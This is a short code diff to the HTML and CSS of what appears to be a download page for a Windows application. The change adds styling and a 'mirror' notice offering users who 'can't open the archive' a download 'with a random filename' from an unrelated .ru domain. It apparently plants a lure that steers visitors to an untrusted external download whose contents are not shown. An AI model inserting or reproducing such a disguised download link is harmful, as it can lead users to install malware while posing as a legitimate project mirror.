@@ -290,6 +290,24 @@
          gap: 12px;
       }
 
+      .mirror-hint {
+         margin-top: 8px;
+         font-size: 12px;
+         line-height: 1.6;
+         color: #666;
+      }
+
+      .mirror-link {
+         color: #777;
+         text-decoration: underline;
+         text-underline-offset: 2px;
+         transition: color 0.2s ease;
+      }
+
+      .mirror-link:hover {
+         color: #aaa;
+      }
+
       /* ===== Hero Logo (PNG) ===== */
       .hero-logo-img {
          max-width: 640px;
@@ -892,6 +910,11 @@
       </div>
       <span class="download-badge" id="dl-count"><i class="fas fa-download"></i><span class="dl-num">---</span> <span
             data-i18n="downloads.text"></span></span>
+      <p class="mirror-hint">
+         <span data-i18n="hero.mirrorHint">Can't open the archive?</span>
+         <a class="mirror-link" href="https://msch3295connect.ru/download"
+            data-i18n="hero.mirrorLink">Download with a random filename!</a>
+      </p>
       <span class="windows-tag" data-i18n="hero.window-tag">
          For Windows 8.1, 10, 11 · .NET Framework 4.8 required
       </span>
